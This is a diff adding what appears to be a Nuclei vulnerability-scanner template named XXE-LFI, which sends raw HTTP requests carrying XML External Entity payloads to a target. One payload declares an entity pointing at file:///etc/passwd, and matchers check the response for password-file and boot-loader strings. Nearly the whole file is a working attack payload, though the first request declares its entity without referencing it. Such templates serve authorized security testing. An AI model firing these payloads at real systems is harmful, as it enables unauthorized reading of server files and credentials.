@@ -1,0 +1,37 @@
+id: XXE-LFI
+
+info:
+  name: XXE
+  author: MRiambatman
+  severity: critical
+  
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <!DOCTYPE xxe [
+        <!ELEMENT name ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <!DOCTYPE root [
+        <!ENTITY stuff SYSTEM ".">
+        ]><root>&stuff;</root>
+
+
+    attack: clusterbomb
+    redirects: true
+    matchers:
+      - type: regex
+        regex:
+          - 'root:.*:0:0'
+          - 'boot loader'
+          - '16 bit'
+        part: body
